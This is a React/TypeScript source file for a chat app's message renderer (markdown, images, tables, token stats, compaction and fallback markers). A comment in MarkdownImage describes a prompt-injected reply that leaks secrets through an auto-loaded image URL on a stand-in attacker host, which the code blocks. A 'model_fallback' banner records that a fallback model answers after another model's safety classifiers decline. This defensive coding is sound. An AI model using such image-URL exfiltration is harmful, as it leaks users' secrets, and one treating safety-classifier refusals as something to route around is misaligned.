/**
 * Message component for displaying individual chat messages
 */

import React, { useState, useRef, useCallback } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import remarkBreaks from 'remark-breaks';
import rehypeHighlight from 'rehype-highlight';
import remarkMath from 'remark-math';
import rehypeKatex from 'rehype-katex';
import remarkMathCurrencyGuard from '../utils/remarkMathCurrencyGuard';
import { Copy, Check } from 'lucide-react';
import { formatTimestamp, formatNumber } from '../utils/formatters';
import { getModelDisplayName } from '../constants/models';
import { API_BASE_URL } from '../api/config';
import { conversationSource, fileDownloadUrl, projectSource } from '../api/fileApi';
import type { MessageContent, ToolUseMessage as ToolUseMessageType, ToolResultMessage as ToolResultMessageType, StatsMessage as StatsMessageType, ErrorMessage as ErrorMessageType, InterruptedMessage as InterruptedMessageType, ActionRequestMessage as ActionRequestMessageType, CompactionMessage as CompactionMessageType, ModelFallbackMessage as ModelFallbackMessageType, RoutineNudgeMessage as RoutineNudgeMessageType, ComposerAttachmentRef } from '../api/types';
import { ToolUseMessage } from './ToolUseMessage';
import { ActionRequestMessage } from './ActionRequestMessage';
import { webSocketManager } from '../services/WebSocketManager';
// KaTeX styles + self-hosted fonts for $...$ / $$...$$ math (remark-math + rehype-katex).
import 'katex/dist/katex.min.css';
import './Message.css';

interface MessageProps {
  role: 'user' | 'assistant';
  content: string;
  timestamp: string;
  model?: string;
  attachments?: ComposerAttachmentRef[];
  conversationId?: string;
  onOpenAttachment?: (att: ComposerAttachmentRef) => void;
  /** Failed-send state for an optimistic user bubble (see api/types.ts). */
  sendFailed?: 'not_connected' | 'unconfirmed';
  onRetrySend?: () => void;
  onDiscardSend?: () => void;
}

const SEND_FAILED_TEXT: Record<'not_connected' | 'unconfirmed', string> = {
  not_connected: 'Not sent: no connection to the server.',
  unconfirmed: 'Not sent: the server did not confirm receiving this message.',
};

interface ErrorBubbleProps {
  error: string;
  stacktrace?: string;
}

/**
 * Error bubble component - displays errors inline as expandable red bubbles
 */
function ErrorBubble({ error, stacktrace }: ErrorBubbleProps) {
  const [isExpanded, setIsExpanded] = useState(false);

  return (
    <div className="message error-bubble">
      <div className="error-bubble-header" onClick={() => setIsExpanded(!isExpanded)}>
        <svg
          className="error-bubble-icon"
          width="16"
          height="16"
          viewBox="0 0 20 20"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
            stroke="currentColor"
            strokeWidth="2"
          />
          <path d="M10 6V10" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
          <path d="M10 14H10.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
        </svg>
        <span className="error-bubble-summary">There was an error</span>
        <svg
          className="error-bubble-chevron"
          width="12"
          height="12"
          viewBox="0 0 12 12"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
          style={{ transform: isExpanded ? 'rotate(180deg)' : 'rotate(0deg)' }}
        >
          <path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
        </svg>
      </div>
      {isExpanded && (
        <div className="error-bubble-details">
          <pre>{error}</pre>
          {stacktrace && (
            <>
              <div className="error-bubble-stacktrace-label">Stack trace:</div>
              <pre>{stacktrace}</pre>
            </>
          )}
        </div>
      )}
    </div>
  );
}

/**
 * CopyableTable component - wraps markdown tables with a hover copy button
 * that copies table data as TSV (tab-separated values) to clipboard.
 */
export function CopyableTable({ children, ...props }: React.HTMLAttributes<HTMLTableElement>) {
  const [copied, setCopied] = useState(false);
  const copyTimeoutRef = useRef<number | null>(null);
  const tableRef = useRef<HTMLTableElement>(null);

  // Cleanup timeout on unmount
  React.useEffect(() => {
    return () => {
      if (copyTimeoutRef.current) clearTimeout(copyTimeoutRef.current);
    };
  }, []);

  const handleCopy = useCallback(() => {
    const table = tableRef.current;
    if (!table) return;

    const rows = table.querySelectorAll('tr');
    const tsvLines: string[] = [];
    rows.forEach((row) => {
      const cells = row.querySelectorAll('th, td');
      const cellTexts: string[] = [];
      cells.forEach((cell) => {
        const text = (cell.textContent || '').replace(/\t/g, ' ').replace(/\n/g, ' ');
        cellTexts.push(text);
      });
      tsvLines.push(cellTexts.join('\t'));
    });
    const tsvData = tsvLines.join('\n');

    const htmlData = table.outerHTML;
    navigator.clipboard.write([
      new ClipboardItem({
        'text/plain': new Blob([tsvData], { type: 'text/plain' }),
        'text/html': new Blob([htmlData], { type: 'text/html' }),
      }),
    ]).then(() => {
      setCopied(true);
      if (copyTimeoutRef.current) clearTimeout(copyTimeoutRef.current);
      copyTimeoutRef.current = window.setTimeout(() => {
        setCopied(false);
      }, 2000);
    }).catch((err) => {
      console.error('Failed to copy table data:', err);
    });
  }, []);

  return (
    <div className="table-copy-wrapper">
      <button
        className={`table-copy-btn${copied ? ' copied' : ''}`}
        onClick={handleCopy}
        title={copied ? 'Copied!' : 'Copy table as TSV'}
      >
        {copied ? <Check size={14} /> : <Copy size={14} />}
      </button>
      <table ref={tableRef} {...props}>{children}</table>
    </div>
  );
}

/**
 * Context giving the shared markdown renderer the conversation whose
 * workspace image paths (`![alt](chart.png)`) should resolve against, plus
 * an optional click-to-enlarge handler. A context (rather than a
 * components-factory taking conversationId) keeps `markdownComponents` a
 * stable module constant, so the React.memo on MessageContentRenderer
 * still holds.
 *
 * `assetBase` switches image resolution to a Quest Doc's asset store (the
 * doc viewer sets it to `docAssetBase(docId)`): `assets/<name>` maps to
 * `<assetBase>/<name>`, every other relative src is a missing ref, and
 * `conversationId` is ignored. Link hrefs of the `assets/<name>` form
 * resolve the same way (other hrefs are untouched).
 */
export interface MarkdownWorkspaceContextValue {
  conversationId?: string;
  /**
   * Resolve bare paths against a project's shared workspace instead (the
   * FileViewerModal .md preview of a Project Files entry). Ignored when
   * `assetBase` or `conversationId` is set; chat never sets it.
   */
  projectId?: string;
  assetBase?: string;
  onOpenImage?: (workspacePath: string, filename: string) => void;
}

export const MarkdownWorkspaceContext = React.createContext<MarkdownWorkspaceContextValue>({});

/** Absolute URLs: any scheme (http:, data:, blob:, ...) or protocol-relative //. */
const EXTERNAL_SRC_RE = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;

/**
 * A Quest Doc image reference: exactly one segment under `assets/`. A
 * leading dot is refused like the server's asset-name check does (and so
 * `.`/`..` can never re-target the URL).
 */
const DOC_ASSET_SRC_RE = /^assets\/([^/.][^/]*)$/;

/**
 * A relative markdown destination as a workspace path: percent-decoded
 * (markdown destinations arrive encoded), with a leading "./", "/" and
 * "workspace/" dropped.
 */
function normalizeMarkdownPath(src: string): string {
  let path = src;
  try {
    path = decodeURIComponent(src);
  } catch {
    // Malformed escape: keep the raw string.
  }
  return path.replace(/^\.\//, '').replace(/^\/+/, '').replace(/^workspace\//, '');
}

/** The doc asset route for an `assets/<name>` path, else null. */
function docAssetUrl(path: string, assetBase: string): string | null {
  const asset = DOC_ASSET_SRC_RE.exec(path);
  return asset ? `${assetBase}/${encodeURIComponent(asset[1])}` : null;
}

/**
 * Markdown `img` renderer: workspace-relative srcs are rewritten to the
 * cookie-authed files/download endpoint of the surrounding conversation,
 * so the model can embed workspace images inline with plain markdown.
 * Inside a doc (`assetBase` set) only `assets/<name>` srcs resolve, to the
 * doc's cookie-authed asset route.
 *
 * External srcs are NEVER auto-fetched: an `<img>` fires its request the
 * moment the transcript renders, so a prompt-injected reply embedding
 * `https://attacker.example/p.png?<secret>` would exfiltrate data with no
 * user interaction. They degrade to a plain click-through link instead
 * (the same user-initiated exposure ordinary markdown links already have).
 */
function MarkdownImage({ src, alt }: React.ImgHTMLAttributes<HTMLImageElement>) {
  const { conversationId, projectId, assetBase, onOpenImage } = React.useContext(MarkdownWorkspaceContext);
  // Track the failing URL rather than a boolean: during streaming an image
  // ref can render with a truncated src that 404s, then re-render complete.
  const [failedSrc, setFailedSrc] = useState<string | null>(null);

  if (!src || typeof src !== 'string') return null;

  if (EXTERNAL_SRC_RE.test(src)) {
    return (
      <a href={src} target="_blank" rel="noopener noreferrer" className="markdown-image-external">
        {alt || src}
      </a>
    );
  }

  // Decoded here, re-encoded as a query param / path segment below.
  const path = normalizeMarkdownPath(src);

  let url: string | null = null;
  if (assetBase) {
    url = docAssetUrl(path, assetBase);
  } else if (conversationId) {
    url = fileDownloadUrl(conversationSource(conversationId), path);
  } else if (projectId) {
    url = fileDownloadUrl(projectSource(projectId), path);
  }

  if (!url || failedSrc === url) {
    return (
      <code className="markdown-image-missing" title={path}>
        {alt || path}
      </code>
    );
  }

  const img = <img src={url} alt={alt || ''} loading="lazy" onError={() => setFailedSrc(url)} />;
  if (!onOpenImage) return img;
  const filename = path.split('/').pop() || path;
  return (
    <button
      type="button"
      className="markdown-image-button"
      onClick={() => onOpenImage(path, filename)}
      title={`Open ${filename}`}
    >
      {img}
    </button>
  );
}

/**
 * Markdown `a` renderer: every link opens in a new tab. Inside a doc
 * (`assetBase` set) a relative `assets/<name>` href -- e.g. a link to an
 * attached image or file -- resolves to the doc's asset route by the same
 * rule as images; every other href is left as written.
 */
function MarkdownLink({ children, href, ...props }: React.AnchorHTMLAttributes<HTMLAnchorElement>) {
  const { assetBase } = React.useContext(MarkdownWorkspaceContext);
  let resolved = href;
  if (assetBase && typeof href === 'string' && href && !EXTERNAL_SRC_RE.test(href)) {
    resolved = docAssetUrl(normalizeMarkdownPath(href), assetBase) ?? href;
  }
  return (
    <a {...props} href={resolved} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  );
}

/** Shared ReactMarkdown components prop for assistant messages */
export const markdownComponents = {
  a: MarkdownLink,
  img: MarkdownImage,
  table: ({ children, ...props }: React.HTMLAttributes<HTMLTableElement>) => (
    <CopyableTable {...props}>{children}</CopyableTable>
  ),
};

// Props for rendering any message content type
interface MessageContentProps {
  message: MessageContent;
  // For tool_use messages, optionally provide the corresponding result
  toolResult?: ToolResultMessageType;
  // Conversation id is forwarded to inline cards (e.g. ActionRequestMessage)
  conversationId?: string;
  // Model ID used for this message (resolved from stats)
  model?: string;
  // Open a user-message attachment in the in-app file viewer modal
  onOpenAttachment?: (att: ComposerAttachmentRef) => void;
}

export function Message({ role, content, timestamp, model, attachments, conversationId, onOpenAttachment, sendFailed, onRetrySend, onDiscardSend }: MessageProps) {
  const hasAttachments = role === 'user' && attachments && attachments.length > 0;
  return (
    <div className={`message ${role}${sendFailed ? ' send-failed' : ''}`}>
      {content && (
        <div className="message-content">
          {role === 'user' ? (
            content
          ) : (
            <ReactMarkdown
              remarkPlugins={[remarkGfm, remarkBreaks, remarkMath, remarkMathCurrencyGuard]}
              rehypePlugins={[rehypeHighlight, rehypeKatex]}
              components={markdownComponents}
            >
              {content}
            </ReactMarkdown>
          )}
        </div>
      )}
      {hasAttachments && (
        <div className="message-attachments">
          {attachments!.map((att) => {
            const downloadUrl = conversationId
              ? `${API_BASE_URL}/conversations/${conversationId}/files/download?path=${encodeURIComponent(att.workspace_path)}`
              : undefined;
            const thumb = (
              <img
                src={downloadUrl}
                alt={att.filename || 'attachment'}
                loading="lazy"
              />
            );
            const canOpen = !!(conversationId && onOpenAttachment);
            return (
              <div key={att.attachment_id} className="message-attachment-thumb">
                {canOpen ? (
                  <button
                    type="button"
                    className="message-attachment-thumb-button"
                    onClick={() => onOpenAttachment!(att)}
                    aria-label={`Open ${att.filename || 'attachment'}`}
                    title={att.filename || 'attachment'}
                  >
                    {thumb}
                  </button>
                ) : (
                  thumb
                )}
              </div>
            );
          })}
        </div>
      )}
      {sendFailed && (
        <div className="message-send-failed" role="alert">
          <span className="message-send-failed-text">{SEND_FAILED_TEXT[sendFailed]}</span>
          {onRetrySend && (
            <button type="button" className="message-send-failed-button" onClick={onRetrySend}>
              Retry
            </button>
          )}
          {onDiscardSend && (
            <button type="button" className="message-send-failed-button" onClick={onDiscardSend}>
              Discard
            </button>
          )}
        </div>
      )}
      {/* Hover-revealed timestamp (+ model for assistant replies), tucked under the bubble */}
      <div className="message-footer">
        <span className="message-timestamp">{formatTimestamp(timestamp)}</span>
        {role === 'assistant' && model && (
          <span className="message-footer-model">{getModelDisplayName(model)}</span>
        )}
      </div>
    </div>
  );
}

/**
 * Renders a MessageContent item based on its type.
 * Wrapped in React.memo to prevent re-renders of already-displayed messages
 * when the parent ChatPanel re-renders due to new streaming content.
 */
export const MessageContentRenderer = React.memo(function MessageContentRenderer({ message, toolResult, conversationId, model, onOpenAttachment }: MessageContentProps) {
  // Handle action_request messages
  if (message.type === 'action_request') {
    return (
      <ActionRequestMessage
        message={message as ActionRequestMessageType}
        conversationId={conversationId || ''}
      />
    );
  }

  // Handle tool_use messages
  if (message.type === 'tool_use') {
    return (
      <ToolUseMessage
        toolUse={message as ToolUseMessageType}
        toolResult={toolResult}
      />
    );
  }

  // Handle tool_result messages - these are typically rendered as part of tool_use
  // but if standalone, show as a simple output block
  if (message.type === 'tool_result') {
    const resultMsg = message as ToolResultMessageType;
    return (
      <div className="message assistant">
        <div className="message-content">
          <pre style={{ margin: 0, whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
            {resultMsg.tool_output}
          </pre>
        </div>
        <div className="message-footer">
          <span className="message-timestamp">{formatTimestamp(resultMsg.timestamp)}</span>
          <span className="message-footer-model">Tool Result</span>
        </div>
      </div>
    );
  }

  // Handle stats messages - display usage statistics
  if (message.type === 'stats') {
    const statsMsg = message as StatsMessageType;
    const { stats } = statsMsg;
    const durationSecs = (stats.duration_ms / 1000).toFixed(1);
    const hasSubAgents = (stats.sub_agent_call_count ?? 0) > 0;
    const cachedTokens = stats.cached_tokens ?? 0;
    const hasCaching = cachedTokens > 0;
    const subAgentCached = stats.sub_agent_cached_tokens ?? 0;
    const hasNewInputTokens = stats.new_input_tokens !== undefined;
    const provider = stats.provider;

    // For the primary display, show only top-level new input when sub-agents are involved
    const topLevelNewInput = stats.top_level_new_input_tokens ?? stats.new_input_tokens;
    const topLevelOutput = stats.top_level_output_tokens ?? stats.output_tokens;
    const primaryNewInput = hasSubAgents ? topLevelNewInput : stats.new_input_tokens;
    const primaryOutput = hasSubAgents ? topLevelOutput : stats.output_tokens;

    // Build tooltip lines for provider-specific breakdown (top-level only)
    const tooltipLines: string[] = [];
    if (hasNewInputTokens && provider) {
      const tlInput = stats.top_level_input_tokens ?? stats.input_tokens;
      const tlCached = stats.top_level_cached_tokens ?? cachedTokens;
      const tlCacheCreation = stats.top_level_cache_creation_tokens ?? stats.cache_creation_tokens ?? 0;
      const tlCacheRead = stats.top_level_cache_read_tokens ?? stats.cache_read_tokens ?? 0;
      if (provider === 'gemini' || provider === 'openrouter') {
        // Both report input_tokens INCLUSIVE of the cached subset.
        tooltipLines.push(`Total input: ${formatNumber(tlInput)}`);
        tooltipLines.push(`Cached: ${formatNumber(tlCached)}`);
        tooltipLines.push(`New: ${formatNumber(primaryNewInput!)}`);
      } else if (provider === 'anthropic') {
        tooltipLines.push(`Non-cached input: ${formatNumber(tlInput)}`);
        tooltipLines.push(`Cache creation: ${formatNumber(tlCacheCreation)}`);
        tooltipLines.push(`Cache read: ${formatNumber(tlCacheRead)}`);
        tooltipLines.push(`New: ${formatNumber(primaryNewInput!)}`);
      }
    }

    // Build sub-agent tooltip
    const subTooltipLines: string[] = [];
    if (hasSubAgents && hasNewInputTokens) {
      const subNewInput = stats.sub_agent_new_input_tokens ?? stats.sub_agent_input_tokens ?? 0;
      subTooltipLines.push(`New input: ${formatNumber(subNewInput)}`);
      if (subAgentCached > 0) subTooltipLines.push(`Cached: ${formatNumber(subAgentCached)}`);
      subTooltipLines.push(`Output: ${formatNumber(stats.sub_agent_output_tokens ?? 0)}`);
      subTooltipLines.push(`Calls: ${stats.sub_agent_call_count}`);
    }

    return (
      <div className="message-stats">
        <div className="stats-container">
          {hasNewInputTokens ? (
            <span className="stats-tooltip-container">
              NEW INPUT {formatNumber(primaryNewInput!)}
              {tooltipLines.length > 0 && (
                <span className="stats-tooltip">{tooltipLines.join('\n')}</span>
              )}
            </span>
          ) : (
            <span>INPUT {formatNumber(stats.input_tokens)}{hasCaching && ` (${formatNumber(cachedTokens)} cached)`}</span>
          )}
          <span>OUTPUT {formatNumber(primaryOutput)}</span>
          <span>TIME {durationSecs}s</span>
          {stats.tool_calls > 0 && <span>TOOLS {stats.tool_calls}</span>}
        </div>
        {hasSubAgents && (
          <div className="stats-breakdown">
            <span className="stats-tooltip-container">
              SUBAGENTS {formatNumber(stats.sub_agent_new_input_tokens ?? stats.sub_agent_input_tokens ?? 0)} / {formatNumber(stats.sub_agent_output_tokens ?? 0)} ({stats.sub_agent_call_count} calls)
              {subTooltipLines.length > 0 && (
                <span className="stats-tooltip">{subTooltipLines.join('\n')}</span>
              )}
            </span>
          </div>
        )}
      </div>
    );
  }

  // Handle error messages - display as expandable red bubble
  if (message.type === 'error') {
    const errorMsg = message as ErrorMessageType;
    return <ErrorBubble error={errorMsg.error} stacktrace={errorMsg.stacktrace} />;
  }

  // Handle compaction markers - system row with the expandable summary the
  // model now sees in place of the compacted history
  if (message.type === 'compaction') {
    const compactionMsg = message as CompactionMessageType;
    const tokensBefore = compactionMsg.tokens_before_estimate;
    const tokensAfter = compactionMsg.tokens_after_estimate;
    const tokensLabel = tokensBefore != null && tokensAfter != null
      ? ` (~${formatNumber(tokensBefore)} → ~${formatNumber(tokensAfter)} tokens)`
      : '';
    return (
      <div className="message-compaction">
        <div className="compaction-row">
          <span className="compaction-icon" aria-hidden="true">&#10537;</span>
          <span className="compaction-text">
            Conversation compacted
            {compactionMsg.messages_summarized != null &&
              ` — ${compactionMsg.messages_summarized} older messages summarized`}
            {tokensLabel}
          </span>
          <span className="compaction-timestamp">
            {compactionMsg.timestamp ? formatTimestamp(compactionMsg.timestamp) : ''}
          </span>
        </div>
        {compactionMsg.summary && (() => {
          // The summary body is markdown; the trailing <preserved-records>
          // block is line-oriented (URLs, file lists, tool outputs) and
          // reads best in monospace. Split and render each accordingly.
          const fullText = compactionMsg.summary;
          const recordsIdx = fullText.indexOf('<preserved-records>');
          const mdPart = recordsIdx >= 0 ? fullText.slice(0, recordsIdx).trimEnd() : fullText;
          const recordsPart = recordsIdx >= 0
            ? fullText.slice(recordsIdx).replace(/\n\[END CONTEXT SUMMARY\]\s*$/, '')
            : '';
          return (
            <details className="compaction-details">
              <summary>Show the summary the model now sees</summary>
              <div className="compaction-summary">
                <div className="compaction-summary-md">
                  <ReactMarkdown
                    remarkPlugins={[remarkGfm, remarkBreaks, remarkMath, remarkMathCurrencyGuard]}
                    rehypePlugins={[rehypeKatex]}
                    components={markdownComponents}
                  >
                    {mdPart}
                  </ReactMarkdown>
                </div>
                {recordsPart && (
                  <pre className="compaction-summary-records">{recordsPart}</pre>
                )}
              </div>
            </details>
          );
        })()}
      </div>
    );
  }

  // Handle refusal-fallback markers - the requested model's safety
  // classifiers declined mid-turn and a fallback model continued the
  // response (see refusal_fallback_models in chat/llm/config.py)
  if (message.type === 'model_fallback') {
    const fallbackMsg = message as ModelFallbackMessageType;
    const fromLabel = fallbackMsg.from_display || fallbackMsg.from_model || 'The requested model';
    const toLabel = fallbackMsg.to_display || fallbackMsg.to_model || 'a fallback model';
    const categoryLabel = fallbackMsg.category ? ` (${fallbackMsg.category})` : '';
    return (
      <div className="message-model-fallback">
        <span className="model-fallback-icon" aria-hidden="true">&#8644;</span>
        <span className="model-fallback-text">
          {fromLabel} declined this request via its safety classifiers{categoryLabel} — answered by {toLabel}
        </span>
        <span className="model-fallback-timestamp">
          {fallbackMsg.timestamp ? formatTimestamp(fallbackMsg.timestamp) : ''}
        </span>
      </div>
    );
  }

  // Handle routine-nudge notices - a routine run ended without calling
  // routine_completed and the server ran one follow-up turn asking the
  // model to verify its work and finish (see chat/routine_runs.py). The
  // exact text the model received is in the tooltip.
  if (message.type === 'routine_nudge') {
    const nudgeMsg = message as RoutineNudgeMessageType;
    return (
      <div className="message-routine-nudge" title={nudgeMsg.content || undefined}>
        <span className="routine-nudge-icon" aria-hidden="true">&#8635;</span>
        <span className="routine-nudge-text">
          Routine run ended without calling routine_completed — asked the model to check its work and finish
        </span>
        <span className="routine-nudge-timestamp">
          {nudgeMsg.timestamp ? formatTimestamp(nudgeMsg.timestamp) : ''}
        </span>
      </div>
    );
  }

  // Handle interrupted messages - display as system message
  if (message.type === 'interrupted') {
    const interruptedMsg = message as InterruptedMessageType;
    return (
      <div className="message-interrupted">
        <span className="interrupted-icon">&#9632;</span>
        <span className="interrupted-text">Response interrupted by user</span>
        <span className="interrupted-timestamp">{formatTimestamp(interruptedMsg.timestamp)}</span>
      </div>
    );
  }

  // Handle text messages (default)
  const textMsg = message as import('../api/types').Message;
  // Failed optimistic sends carry Retry / Discard; both act through the
  // WebSocket manager, which still holds the exact envelope to re-send.
  const sendFailed = textMsg.role === 'user' ? textMsg.send_failed : undefined;
  const clientSendId = textMsg.client_send_id;
  const canRecover = !!(sendFailed && conversationId && clientSendId);
  return (
    <Message
      role={textMsg.role}
      content={textMsg.content || ''}
      timestamp={textMsg.timestamp}
      model={model}
      attachments={textMsg.attachments}
      conversationId={conversationId}
      onOpenAttachment={onOpenAttachment}
      sendFailed={sendFailed}
      onRetrySend={canRecover ? () => webSocketManager.retryFailedSend(conversationId!, clientSendId!) : undefined}
      onDiscardSend={canRecover ? () => webSocketManager.discardFailedSend(conversationId!, clientSendId!) : undefined}
    />
  );
});
